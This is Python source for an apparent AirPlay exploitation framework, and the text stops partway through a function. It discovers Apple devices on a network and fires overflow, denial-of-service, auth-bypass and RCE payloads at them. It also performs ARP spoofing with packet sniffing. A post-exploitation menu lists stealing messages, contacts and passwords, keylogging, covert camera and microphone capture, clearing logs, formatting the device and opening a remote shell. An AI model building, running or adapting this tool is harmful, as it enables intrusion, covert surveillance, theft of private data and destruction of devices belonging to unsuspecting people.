"""
airborne_exploit.py
"""

import socket
import time
import json
import csv
import threading
import os
import sys
import argparse
from datetime import datetime
from threading import Thread
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import UDP, IP
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
import netifaces
from mac_vendor_lookup import MacLookup
from zeroconf import ServiceBrowser, Zeroconf
from payloads import PayloadGenerator
from rce_exploit import RCEExploit
from system_commands import SystemCommands
from file_manager import FileManager
from device_control import DeviceControl
from camera_mic import CameraMic
from keylogger import Keylogger
from network_commands import NetworkCommands
from advanced_commands import AdvancedCommands

console = Console()

# شعار الأداة المتقدم
logo = r"""
   ___    __  __       ____  _____  _____  _   _ ______ 
  / _ \  / / / /___   / __ \/ _ \ \/ / _ \/ | / / ____/
 / /_/ / / /_/ / __/  / /_/ / , _/\  / ___/  |/ / __/   
/ .___/  \____/_/     \____/_/|_| /_/_/  /_/|_/_/____/  
/_/          AirPlay Exploitation Framework - By: ꧁༒المهيب༒꧂
"""

# Known vulnerabilities (unchanged)
KNOWN_VULNERABILITIES = {
    "CVE-2015-5774": {
        "description": "AirPlay Mirroring information leak in Apple TV before 7.2.2",
        "ports": [7000, 7100],
        "payload": "info_leak",
        "devices": ["AppleTV3,1", "AppleTV3,2"]
    },
    "CVE-2018-4141": {
        "description": "AirPlay buffer overflow in iOS before 11.3",
        "ports": [7000, 62078],
        "payload": "buffer_overflow",
        "devices": ["iPhone", "iPad", "iPod"]
    },
    "CVE-2020-3831": {
        "description": "AirPlay authentication bypass in macOS before 10.15.3",
        "ports": [5353, 5000],
        "payload": "auth_bypass",
        "devices": ["Mac"]
    },
    "AirDoS": {
        "description": "AirPlay Denial of Service via malformed requests",
        "ports": [7000, 5353],
        "payload": "dos",
        "devices": ["all"]
    },
    "RTSP_Flood": {
        "description": "RTSP protocol flooding attack",
        "ports": [554, 7000],
        "payload": "rtsp_flood",
        "devices": ["AppleTV", "HomePod"]
    },
    "Custom_Exploit": {
        "description": "Custom exploits for advanced attacks",
        "ports": [7000, 5353, 554, 62078],
        "payload": [
            "header_flood", "http_smuggling", "format_string", "dir_traversal",
            "null_byte_injection", "unicode_overflow", "invalid_method",
            "fake_protocol", "command_injection", "chunked_bomb",
            "apple_misidentify", "x_forwarded_spoof", "airplay_feature_abuse",
            "json_injection"
        ],
        "devices": ["all"]
    },
    "Kernel_RCE": {
        "description": "Kernel-level Remote Code Execution via command injection",
        "ports": [7000, 62078],
        "payload": "rce_command_injection",
        "devices": ["all"]
    }
}

class AirPlayListener:
    def __init__(self):
        self.devices = []
        
    def add_service(self, zeroconf, type, name):
        info = zeroconf.get_service_info(type, name)
        if info:
            device = {
                'name': name,
                'ip': socket.inet_ntoa(info.addresses[0]),
                'port': info.port,
                'type': type,
                'properties': info.properties
            }
            self.devices.append(device)

def print_logo():
    console.print(f"[bold cyan]{logo}[/bold cyan]")

def get_network_info(interface='eth0'):
    try:
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET][0]
        netmask = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['netmask']
        return default_gateway, netmask
    except Exception as e:
        console.print(f"[bold red]Error getting network info: {e}[/bold red]")
        return None, None

def advanced_arp_scan(network=None, interface='eth0'):
    devices = []
    try:
        if not network:
            gateway, netmask = get_network_info(interface)
            if gateway:
                network = '.'.join(gateway.split('.')[:3]) + '.0/24'
        
        console.print(f"[bold yellow]Performing ARP scan on {network}...[/bold yellow]")
        
        ans, unans = arping(network, timeout=2, verbose=False)
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Scanning...", total=len(ans))
            
            for sent, received in ans:
                try:
                    vendor = MacLookup().lookup(received.hwsrc)
                except:
                    vendor = "Unknown"
                
                devices.append({
                    'ip': received.psrc,
                    'mac': received.hwsrc,
                    'vendor': vendor,
                    'timestamp': datetime.now().isoformat()
                })
                progress.update(task, advance=1)
                
        return devices
        
    except Exception as e:
        console.print(f"[bold red]ARP Scan Error: {e}[/bold red]")
        return []

def enhanced_mdns_scan(timeout=5):
    console.print("[bold yellow]Discovering and fingerprinting mDNS/AirPlay devices...[/bold yellow]")
    
    zeroconf = Zeroconf()
    listener = AirPlayListener()
    browser = ServiceBrowser(zeroconf, "_airplay._tcp.local.", listener)
    
    time.sleep(timeout)
    
    for device in listener.devices:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((device['ip'], device['port']))
            s.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
            response = s.recv(4096).decode(errors='ignore')
            s.close()
            
            if 'Server:' in response:
                device['headers'] = {}
                for line in response.split('\r\n'):
                    if ':' in line:
                        key, val = line.split(':', 1)
                        device['headers'][key.strip()] = val.strip()
        except:
            pass
        
        device['type'] = detect_device_type(device)
    
    zeroconf.close()
    return listener.devices

def detect_device_type(device_info):
    if not device_info:
        return "Unknown"
    
    if 'properties' in device_info:
        props = device_info['properties']
        if b'model' in props:
            model = props[b'model'].decode().lower()
            if 'appletv' in model:
                return "Apple TV"
            elif 'homepod' in model:
                return "HomePod"
            elif 'airport' in model:
                return "AirPort"
    
    if 'headers' in device_info:
        headers = device_info['headers']
        if 'server' in headers:
            if 'AppleTV' in headers['server']:
                return "Apple TV"
            elif 'AirPort' in headers['server']:
                return "AirPort"
    
    if 'mac' in device_info:
        vendor = device_info.get('vendor', '').lower()
        if 'apple' in vendor:
            if 'tv' in vendor:
                return "Apple TV"
            return "Apple Device"
    
    return "Unknown Apple Device"

def port_scan(ip, ports=[7000, 5353, 62078], timeout=1):
    open_ports = []
    console.print(f"[bold yellow]Scanning ports on {ip}...[/bold yellow]")
    
    with Progress() as progress:
        task = progress.add_task("[cyan]Scanning ports...", total=len(ports))
        
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                open_ports.append(port)
            progress.update(task, advance=1)
    
    return open_ports

def generate_payload(payload_type, size=1024):
    """Generate payload using the PayloadGenerator class from payloads.py."""
    try:
        return PayloadGenerator.generate_payload(payload_type, size)
    except ValueError as e:
        console.print(f"[bold red]Error generating payload: {e}[/bold red]")
        return b"A" * size

class ResponseAnalyzer:
    @staticmethod
    def analyze_response(response, payload_type):
        """Analyze device responses for vulnerability indicators."""
        indicators = {
            "crash": ["segmentation fault", "connection reset", "no response"],
            "info_leak": ["build version", "x-apple-", "internal ip"],
            "buffer_overflow": ["stack smashing", "buffer overflow"],
            "auth_bypass": ["authentication successful", "welcome admin"],
            "dos": ["service unavailable", "connection refused"],
            "rtsp_flood": ["rtsp error", "protocol error"],
            "fake_pairing": ["pairing successful", "bypass accepted"],
            "fake_login": ["login successful", "bypass accepted"],
            "airplay_hello": ["rtsp/1.0 200 ok", "options response"],
            "airplay_shutdown": ["shutdown initiated", "service stopped"],
            "exploit_header_size": ["header too large", "bad request"],
            "header_flood": ["too many headers", "request timeout"],
            "http_smuggling": ["chunked", "transfer-encoding"],
            "format_string": ["%x", "%n", "format error"],
            "dir_traversal": ["etc/passwd", "root:", "admin:"],
            "null_byte_injection": ["null byte", "invalid url"],
            "unicode_overflow": ["unicode", "encoding error"],
            "invalid_method": ["method not allowed", "invalid method"],
            "fake_protocol": ["protocol error", "invalid rtsp"],
            "command_injection": ["hacked", "command executed"],
            "chunked_bomb": ["large payload", "timeout"],
            "apple_misidentify": ["android", "invalid user-agent"],
            "x_forwarded_spoof": ["forwarded", "localhost"],
            "airplay_feature_abuse": ["features", "capabilities"],
            "json_injection": ["reboot", "config updated"],
            "rce_command_injection": ["uid=", "whoami", "command executed"]
        }
        
        results = []
        response_str = response.decode(errors='ignore').lower()
        
        for vuln_type, patterns in indicators.items():
            for pattern in patterns:
                if pattern in response_str:
                    results.append({
                        'vulnerability': vuln_type,
                        'indicator': pattern,
                        'payload': payload_type
                    })
        
        return results

    @staticmethod
    def check_vulnerability(ip, port, vulnerability):
        vuln_info = KNOWN_VULNERABILITIES.get(vulnerability)
        if not vuln_info:
            return {'status': 'error', 'message': 'Unknown vulnerability'}
        
        if port not in vuln_info['ports']:
            return {'status': 'error', 'message': f"Port {port} not typical for this vulnerability"}
        
        if vulnerability == "Kernel_RCE":
            result = RCEExploit.execute_rce(ip, port, "whoami")
            if result['status'] == 'success':
                return {
                    'status': 'vulnerable',
                    'vulnerability': vulnerability,
                    'details': [{'vulnerability': 'rce_command_injection', 'indicator': 'command executed'}],
                    'response': result['response']
                }
            else:
                return {
                    'status': 'not_vulnerable',
                    'vulnerability': vulnerability,
                    'response': result.get('error', 'No response')
                }
        
        payload = generate_payload(vuln_info['payload'] if isinstance(vuln_info['payload'], str) else vuln_info['payload'][0])
        results = []
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((ip, port))
                s.send(payload)
                response = s.recv(65535)
                
                if response:
                    analysis = ResponseAnalyzer.analyze_response(response, vuln_info['payload'])
                    if analysis:
                        return {
                            'status': 'vulnerable',
                            'vulnerability': vulnerability,
                            'details': analysis,
                            'response': response.decode(errors='ignore')[:500]
                        }
                    else:
                        return {
                            'status': 'not_vulnerable',
                            'vulnerability': vulnerability,
                            'response': 'No known indicators found'
                        }
                else:
                    return {
                        'status': 'possible',
                        'vulnerability': vulnerability,
                        'details': 'No response received - possible DoS condition'
                    }
        except Exception as e:
            return {
                'status': 'error',
                'vulnerability': vulnerability,
                'error': str(e)
            }

    @staticmethod
    def create_custom_exploit(vuln_id):
        exploits = {
            "CVE-2015-5774": [
                generate_payload("info_leak", 5000),
                generate_payload("buffer_overflow", 1000000)
            ],
            "CVE-2018-4141": [
                generate_payload("buffer_overflow", 20000),
                generate_payload("exploit_header_size", 5000)
            ],
            "CVE-2020-3831": [
                generate_payload("auth_bypass", 1024),
                generate_payload("fake_pairing", 1024)
            ],
            "Custom_Exploit": [
                generate_payload("http_smuggling", 1024),
                generate_payload("format_string", 1024),
                generate_payload("dir_traversal", 1024),
                generate_payload("json_injection", 1024)
            ],
            "Kernel_RCE": [
                RCEExploit.generate_rce_payload("whoami", 1024),
                RCEExploit.generate_rce_payload("id", 1024),
                RCEExploit.generate_rce_payload("uname -a", 1024)
            ]
        }
        return exploits.get(vuln_id, [b"GET / HTTP/1.1\r\n\r\n"])

    @staticmethod
    def execute_post_exploitation(ip, port, vuln_id):
        console.print(f"[bold green]Starting post-exploitation on {ip}:{port}...[/bold green]")
        
        if vuln_id == "Kernel_RCE":
            console.print("[bold green]Initiating RCE interactive shell...[/bold green]")
            RCEExploit.interactive_rce_shell(ip, port)
            return
        
        try:
            if vuln_id == "CVE-2020-3831":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(b"GET /system-info HTTP/1.1\r\n\r\n")
                response = s.recv(65535).decode(errors='ignore')
                s.close()
                
                if response:
                    console.print(Panel(response[:1000], title="System Information"))
                    
                    if 'macOS' in response:
                        console.print("[bold yellow]Attempting command injection...[/bold yellow]")
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip, port))
                        s.send(generate_payload("command_injection", 1024))
                        response = s.recv(65535).decode(errors='ignore')
                        s.close()
                        console.print(Panel(response, title="Command Output"))
            
            elif vuln_id in ["CVE-2015-5774", "CVE-2018-4141"]:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(b"GET /private-data HTTP/1.1\r\n\r\n")
                response = s.recv(65535).decode(errors='ignore')
                s.close()
                
                if "Apple" in response:
                    console.print("[bold red]Potential data leak detected![/bold red]")
                    console.print(Panel(response[:500] + ("..." if len(response) > 500 else "")))
        
        except Exception as e:
            console.print(f"[bold red]Post-exploitation failed: {e}[/bold red]")

    @staticmethod
    def advanced_response_analysis(response, protocol="HTTP"):
        analysis = {
            "protocol": protocol,
            "headers": {},
            "potential_leaks": [],
            "vulnerable_indicators": []
        }
        
        try:
            if protocol == "HTTP":
                headers, _, body = response.partition(b'\r\n\r\n')
                headers = headers.decode(errors='ignore')
                body = body.decode(errors='ignore')
                
                for line in headers.split('\r\n'):
                    if ':' in line:
                        key, val = line.split(':', 1)
                        analysis['headers'][key.strip()] = val.strip()
                
                sensitive_patterns = ["password", "secret", "token", "key", "internal"]
                for pattern in sensitive_patterns:
                    if pattern in body.lower():
                        analysis['potential_leaks'].append(pattern)
                
                vuln_patterns = ["stack", "overflow", "segmentation", "memory", "corruption", "uid=", "whoami"]
                for pattern in vuln_patterns:
                    if pattern in body.lower():
                        analysis['vulnerable_indicators'].append(pattern)
            
            elif protocol == "RTSP":
                lines = response.decode(errors='ignore').split('\r\n')
                for line in lines:
                    if ':' in line:
                        key, val = line.split(':', 1)
                        analysis['headers'][key.strip()] = val.strip()
                
                if "401 Unauthorized" in lines[0]:
                    analysis['vulnerable_indicators'].append("weak_auth")
                
                if "Server:" in analysis['headers']:
                    if "Apple" in analysis['headers']['Server']:
                        analysis['vulnerable_indicators'].append("apple_device")
            
            return analysis
        
        except Exception as e:
            console.print(f"[red]Analysis error: {e}[/red]")
            return analysis

def send_custom_payload(ip, port, payload_type="basic", size=1024, count=1):
    try:
        console.print(f"[bold yellow]Preparing {payload_type} payload for {ip}:{port}...[/bold yellow]")
        
        if payload_type == "rce_command_injection":
            payload = RCEExploit.generate_rce_payload("whoami", size)
        else:
            payload = generate_payload(payload_type, size)
        
        packet = IP(dst=ip)/UDP(dport=port)/Raw(load=payload)
        
        with Progress() as progress:
            task = progress.add_task("[red]Sending payload...", total=count)
            
            for i in range(count):
                send(packet, verbose=False)
                progress.update(task, advance=1)
                time.sleep(0.1)
                
        console.print("[bold green]Payloads sent successfully![/bold green]")
    except Exception as e:
        console.print(f"[bold red]Error sending payload: {e}[/bold red]")

def send_and_analyze(ip, port, payload_type="basic", size=1024, count=1):
    try:
        if payload_type == "rce_command_injection":
            result = RCEExploit.execute_rce(ip, port, "whoami")
            if result['status'] == 'success':
                return [{
                    'status': 'vulnerable',
                    'vulnerability': 'rce_command_injection',
                    'payload': payload_type,
                    'response': result['response']
                }]
            else:
                return [{
                    'status': 'error',
                    'error': result.get('error', 'No response'),
                    'payload': payload_type
                }]
        
        payload = generate_payload(payload_type, size)
        results = []
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            try:
                s.connect((ip, port))
                s.send(payload)
                response = s.recv(65535)
                
                if response:
                    analysis = ResponseAnalyzer.analyze_response(response, payload_type)
                    if analysis:
                        results.extend(analysis)
                    else:
                        results.append({'status': 'response_received', 'payload': payload_type})
                else:
                    results.append({'status': 'no_response', 'payload': payload_type})
            except Exception as e:
                results.append({
                    'status': 'error',
                    'error': str(e),
                    'payload': payload_type
                })
        
        return results
    except Exception as e:
        console.print(f"[bold red]Error in send_and_analyze: {e}[/bold red]")
        return []

def send_payload_sequence(ip, port, payload_type):
    sequences = {
        "info_leak": [
            b"GET /info HTTP/1.1\r\n\r\n",
            b"GET /server-info HTTP/1.1\r\n\r\n",
            generate_payload("info_leak", 5000)
        ],
        "buffer_overflow": [
            generate_payload("buffer_overflow", 1000000),
            b"GET /play?code=" + b"B" * 5000 + b" HTTP/1.1\r\n\r\n",
            b"POST /setup HTTP/1.1\r\nX-Apple-Overflow: " + b"C" * 20000 + b"\r\n\r\n"
        ],
        "auth_bypass": [
            generate_payload("auth_bypass", 1024),
            generate_payload("fake_pairing", 1024),
            generate_payload("fake_login", 1024)
        ],
        "dos": [
            generate_payload("dos", 50000),
            generate_payload("chunked_bomb", 100000),
            generate_payload("header_flood", 1024)
        ],
        "rtsp_flood": [
            generate_payload("rtsp_flood", 5000),
            generate_payload("fake_protocol", 1024),
            generate_payload("airplay_hello", 1024)
        ],
        "custom_exploit": [
            generate_payload("http_smuggling", 1024),
            generate_payload("format_string", 1024),
            generate_payload("dir_traversal", 1024),
            generate_payload("null_byte_injection", 1024),
            generate_payload("unicode_overflow", 1024),
            generate_payload("command_injection", 1024),
            generate_payload("json_injection", 1024)
        ],
        "rce_command_injection": [
            RCEExploit.generate_rce_payload("whoami", 1024),
            RCEExploit.generate_rce_payload("id", 1024),
            RCEExploit.generate_rce_payload("uname -a", 1024)
        ]
    }
    
    payloads = sequences.get(payload_type, [b"GET / HTTP/1.1\r\n\r\n"])
    results = []
    
    with Progress() as progress:
        task = progress.add_task("[red]Sending payload sequence...", total=len(payloads))
        
        for payload in payloads:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, port))
                s.send(payload)
                response = s.recv(65535)
                s.close()
                
                analysis = ResponseAnalyzer.advanced_response_analysis(response)
                results.append({
                    "payload": payload[:50] + (b"..." if len(payload) > 50 else b""),
                    "response_analysis": analysis
                })
            except Exception as e:
                results.append({
                    "payload": payload[:50] + (b"..." if len(payload) > 50 else b""),
                    "error": str(e)
                })
            
            progress.update(task, advance=1)
    
    return results

def monitor_device_status(ip, duration=30):
    console.print(f"[bold yellow]Monitoring device {ip} for {duration} seconds...[/bold yellow]")
    
    results = {
        "ping": False,
        "mdns": False,
        "ports": []
    }
    
    try:
        response = os.system(f"ping -c 1 {ip} > /dev/null 2>&1")
        results["ping"] = (response == 0)
    except:
        pass
    
    try:
        zeroconf = Zeroconf()
        listener = AirPlayListener()
        browser = ServiceBrowser(zeroconf, "_airplay._tcp.local.", listener)
        time.sleep(5)
        zeroconf.close()
        
        for device in listener.devices:
            if device['ip'] == ip:
                results["mdns"] = True
                break
    except:
        pass
    
    common_ports = [7000, 5353, 62078, 3689]
    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        sock.close()
        results["ports"].append({
            "port": port,
            "open": (result == 0)
        })
    
    return results

def arp_spoof(target_ip, gateway_ip, interface='eth0', duration=10):
    try:
        console.print(f"[bold red]Starting ARP spoofing attack on {target_ip} for {duration} seconds...[/bold red]")
        
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)
        
        if not target_mac or not gateway_mac:
            console.print("[bold red]Could not resolve MAC addresses![/bold red]")
            return
            
        stop_event = threading.Event()
        
        def spoof():
            while not stop_event.is_set():
                send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=False)
                send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=False)
                time.sleep(2)
        
        def monitor_traffic():
            sniff_filter = f"host {target_ip}"
            packets = sniff(filter=sniff_filter, iface=interface, timeout=duration, stop_filter=lambda x: stop_event.is_set())
            return packets
        
        spoof_thread = threading.Thread(target=spoof)
        monitor_thread = threading.Thread(target=monitor_traffic)
        
        spoof_thread.start()
        monitor_thread.start()
        
        time.sleep(duration)
        stop_event.set()
        spoof_thread.join()
        
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5, verbose=False)
        
        console.print("[bold green]ARP spoofing completed and network restored![/bold green]")
        
    except Exception as e:
        console.print(f"[bold red]ARP Spoofing Error: {e}[/bold red]")

def create_interactive_session(ip, port):
    console.print(f"[bold green]Starting interactive session with {ip}:{port}...[/bold green]")
    console.print("[yellow]Type 'help' for available commands or 'exit' to end the session[/yellow]")

    commands = {
        "help": {
            "description": "Display available commands and their descriptions",
            "function": lambda: show_help()
        },
        "get_system_info": {
            "description": "Retrieve system version (e.g., iOS/macOS)",
            "function": lambda: get_system_info(ip, port)
        },
        "get_device_model": {
            "description": "Retrieve device model (e.g., AppleTV3,1)",
            "function": lambda: get_device_model(ip, port)
        },
        "get_network_info": {
            "description": "Retrieve MAC and IP addresses within the network",
            "function": lambda: get_network_info_cmd(ip, port)
        },
        "get_airplay_settings": {
            "description": "Retrieve AirPlay settings or configurations",
            "function": lambda: get_airplay_settings(ip, port)
        },
        "send_payload": {
            "description": "Send a specific payload to the target",
            "function": lambda: send_specific_payload(ip, port)
        },
        "download_files": {
            "description": "Download all files from the target device",
            "function": lambda: RCEExploit.download_all_files(ip, port)
        },
        "zip_images": {
            "description": "Download and zip all images from the target device",
            "function": lambda: RCEExploit.zip_all_images(ip, port)
        },
        "device_info": {
            "description": "Retrieve comprehensive device information",
            "function": lambda: RCEExploit.get_device_info(ip, port)
        },
        "upload_program": {
            "description": "Upload a program to the target device",
            "function": lambda: upload_program_cmd(ip, port)
        },
        "check_battery": {
            "description": "Check the battery status of the target device",
            "function": lambda: RCEExploit.check_battery(ip, port)
        },
        "screenshot": {
            "description": "Capture a screenshot from the target device",
            "function": lambda: RCEExploit.capture_screenshot(ip, port)
        },
        "front_camera": {
            "description": "Capture an image from the front camera",
            "function": lambda: RCEExploit.capture_front_camera(ip, port)
        },
        "back_camera": {
            "description": "Capture an image from the back camera",
            "function": lambda: RCEExploit.capture_back_camera(ip, port)
        },
        "front_video": {
            "description": "Record a video from the front camera",
            "function": lambda: record_front_video_cmd(ip, port)
        },
        "back_video": {
            "description": "Record a video from the back camera",
            "function": lambda: record_back_video_cmd(ip, port)
        },
        "whatsapp_messages": {
            "description": "Retrieve WhatsApp messages",
            "function": lambda: RCEExploit.get_whatsapp_messages(ip, port)
        },
        "telegram_messages": {
            "description": "Retrieve Telegram messages",
            "function": lambda: RCEExploit.get_telegram_messages(ip, port)
        },
        "contacts": {
            "description": "Retrieve all contacts (name and phone number)",
            "function": lambda: RCEExploit.get_contacts(ip, port)
        },
        "emails": {
            "description": "Retrieve email addresses",
            "function": lambda: RCEExploit.get_emails(ip, port)
        },
        "sms": {
            "description": "Retrieve SMS messages",
            "function": lambda: RCEExploit.get_sms(ip, port)
        },
        "call_logs": {
            "description": "Retrieve call logs",
            "function": lambda: RCEExploit.get_call_logs(ip, port)
        },
        "delete_file": {
            "description": "Delete a file or image from the target device",
            "function": lambda: delete_file_cmd(ip, port)
        },
        "list_processes": {
            "description": "List running processes on the target device",
            "function": lambda: RCEExploit.list_processes(ip, port)
        },
        "shutdown": {
            "description": "Shutdown the target device",
            "function": lambda: DeviceControl.shutdown(ip, port)
        },
        "sysinfo": {
            "description": "Retrieve system information",
            "function": lambda: SystemCommands.sysinfo(ip, port)
        },
        "getuid": {
            "description": "Retrieve current user ID",
            "function": lambda: SystemCommands.getuid(ip, port)
        },
        "getpid": {
            "description": "Retrieve process ID of the current session",
            "function": lambda: SystemCommands.getpid(ip, port)
        },
        "ps": {
            "description": "List all running processes",
            "function": lambda: SystemCommands.ps(ip, port)
        },
        "getenv": {
            "description": "Retrieve environment variables",
            "function": lambda: SystemCommands.getenv(ip, port)
        },
        "ifconfig": {
            "description": "Retrieve network configuration",
            "function": lambda: SystemCommands.ifconfig(ip, port)
        },
        "ls": {
            "description": "List directory contents",
            "function": lambda: ls_cmd(ip, port)
        },
        "cd": {
            "description": "Change current directory",
            "function": lambda: cd_cmd(ip, port)
        },
        "pwd": {
            "description": "Print current working directory",
            "function": lambda: FileManager.pwd(ip, port)
        },
        "download": {
            "description": "Download a file from the target device",
            "function": lambda: download_cmd(ip, port)
        },
        "upload": {
            "description": "Upload a file to the target device",
            "function": lambda: upload_cmd(ip, port)
        },
        "rm": {
            "description": "Delete a file from the target device",
            "function": lambda: rm_cmd(ip, port)
        },
        "edit": {
            "description": "Edit a file on the target device",
            "function": lambda: edit_cmd(ip, port)
        },
        "mkdir": {
            "description": "Create a directory on the target device",
            "function": lambda: mkdir_cmd(ip, port)
        },
        "execute": {
            "description": "Execute a program on the target device",
            "function": lambda: execute_cmd(ip, port)
        },
        "kill": {
            "description": "Kill a process by PID",
            "function": lambda: kill_cmd(ip, port)
        },
        "reboot": {
            "description": "Reboot the target device",
            "function": lambda: DeviceControl.reboot(ip, port)
        },
        "webcam_list": {
            "description": "List available webcams",
            "function": lambda: CameraMic.webcam_list(ip, port)
        },
        "webcam_snap": {
            "description": "Capture a snapshot from the camera",
            "function": lambda: webcam_snap_cmd(ip, port)
        },
        "webcam_stream": {
            "description": "Stream video from the camera",
            "function": lambda: webcam_stream_cmd(ip, port)
        },
        "record_mic": {
            "description": "Record audio from the microphone",
            "function": lambda: record_mic_cmd(ip, port)
        },
        "keyscan_start": {
            "description": "Start keylogging",
            "function": lambda: Keylogger.keyscan_start(ip, port)
        },
        "keyscan_dump": {
            "description": "Dump recorded keystrokes",
            "function": lambda: Keylogger.keyscan_dump(ip, port)
        },
        "keyscan_stop": {
            "description": "Stop keylogging",
            "function": lambda: Keylogger.keyscan_stop(ip, port)
        },
        "portfwd": {
            "description": "Add port forwarding rule",
            "function": lambda: portfwd_cmd(ip, port)
        },
        "route": {
            "description": "Display or manage network routing table",
            "function": lambda: NetworkCommands.route(ip, port)
        },
        "check_proxy": {
            "description": "Check for proxy settings",
            "function": lambda: NetworkCommands.check_proxy(ip, port)
        },
        "arp": {
            "description": "Display ARP table",
            "function": lambda: NetworkCommands.arp(ip, port)
        },
        "extract_passwords": {
            "description": "Extract passwords from the target device",
            "function": lambda: AdvancedCommands.extract_passwords(ip, port)
        },
        "clearev": {
            "description": "Clear event logs on the target device",
            "function": lambda: AdvancedCommands.clearev(ip, port)
        },
        "background": {
            "description": "Move session to background",
            "function": lambda: AdvancedCommands.background(ip, port)
        },
        "sessions": {
            "description": "Switch to a specific session",
            "function": lambda: sessions_cmd(ip, port)
        },
        "format_device": {
            "description": "Format the target device (DANGEROUS)",
            "function": lambda: AdvancedCommands.format_device(ip, port)
        },
        "shell": {
            "description": "Enter a native system shell (cmd or sh)",
            "function": lambda: shell_cmd(ip, port)
        },
        "run": {
            "description": "Run a Ruby script (Metasploit style)",
            "function": lambda: run_cmd(ip, port)
        },
        "exit": {
            "description": "Exit the interactive session",
            "function": lambda: "exit"
        }
    }

    def show_help():
        table = Table(title="Available Commands", style="bold cyan")
        table.add_column("Command", style="cyan")
        table.add_column("Description", style="yellow")
        for cmd, info in commands.items():
            table.add_row(cmd, info["description"])
        console.print(table)

    def get_system_info(ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((ip, port))
                s.send(b"GET /system-info HTTP/1.1\r\nHost: localhost\r\n\r\n")
                response = s.recv(65535).decode(errors='ignore')
                if response:
                    console.print(Panel(response[:1000], title="System Version"))
                else:
                    console.print("[red]No system information received[/red]")
        except Exception as e:
            console.print(f"[red]Error retrieving system info: {e}[/red]")

    def get_device_model(ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((ip, port))
                s.send(b"GET /device-info HTTP/1.1\r\nHost: localhost\r\n\r\n")
                response = s.recv(65535).decode(errors='ignore')
                if response:
                    console.print(Panel(response[:1000], title="Device Model"))
                else:
                    console.print("[red]No device model information received[/red]")
        except Exception as e:
            console.print(f"[red]Error retrieving device model: {e}[/red]")

    def get_network_info_cmd(ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((ip, port))
                s.send(b"GET /network-info HTTP/1.1\r\nHost: localhost\r\n\r\n")
                response = s.recv(65535).decode(errors='ignore')
                if response:
                    console.print(Panel(response[:1000], title="Network Information"))
                else:
                    console.print("[red]No network information received[/red]")
        except Exception as e:
            console.print(f"[red]Error retrieving network info: {e}[/red]")

    def get_airplay_settings(ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((ip, port))
                s.send(b"GET /airplay-settings HTTP/1.1\r\nHost: localhost\r\n\r\n")
                response = s.recv(65535).decode(errors='ignore')
                if response:
                    console.print(Panel(response[:1000], title="AirPlay Settings"))
                else:
                    console.print("[red]No AirPlay settings received[/red]")
        except Exception as e:
            console.print(f"[red]Error retrieving AirPlay settings: {e}[/red]")

    def send_specific_payload(ip, port):
        payload_options = PayloadGenerator.get_available_payloads() + ["rce_command_injection"]
        payload_menu = "\n".join([f"{i+1}. {p} - {PayloadGenerator.get_payload_description(p) if p != 'rce_command_injection' else 'Kernel RCE command injection'}" 
                                 for i, p in enumerate(payload_options)])
        
        console.print(Panel(f"[bold]Available Payloads:[/bold]\n{payload_menu}", title="Payload Options"))
        payload_choice = IntPrompt.ask("[bold cyan]Select payload type (1-{})[/bold cyan]".format(len(payload_options)),
                                     choices=[str(i+1) for i in range(len(payload_options))])
        
        size = IntPrompt.ask("[bold cyan]Enter payload size (bytes)[/bold cyan]", default=1024)
        count = IntPrompt.ask("[bold cyan]Enter number of packets[/bold cyan]", default=1)
        
        selected_payload = payload_options[payload_choice - 1]
        results = send_and_analyze(ip, port, selected_payload, size, count)
        
        if results:
            table = Table(title="Payload Analysis Results", style="bold yellow")
            table.add_column("Payload", style="cyan")
            table.add_column("Status", style="magenta")
            table.add_column("Details", style="green")
            
            for result in results:
                if 'vulnerability' in result:
                    table.add_row(result['payload'], 
                                 f"[red]Vulnerable[/red]", 
                                 f"{result['vulnerability']} detected")
                    if result['vulnerability'] == 'rce_command_injection':
                        console.print("[bold green]RCE exploit successful! Starting interactive shell...[/bold green]")
                        RCEExploit.interactive_rce_shell(ip, port)
                else:
                    table.add_row(result['payload'], 
                                 "[green]Secure[/green]", 
                                 result.get('status', 'no issues detected'))
            
            console.print(table)
        else:
            console.print("[bold red]No results received from target[/bold red]")

    def ls_cmd(ip, port):
        directory = Prompt.ask("[bold cyan]Enter directory to list[/bold cyan]", default=".")
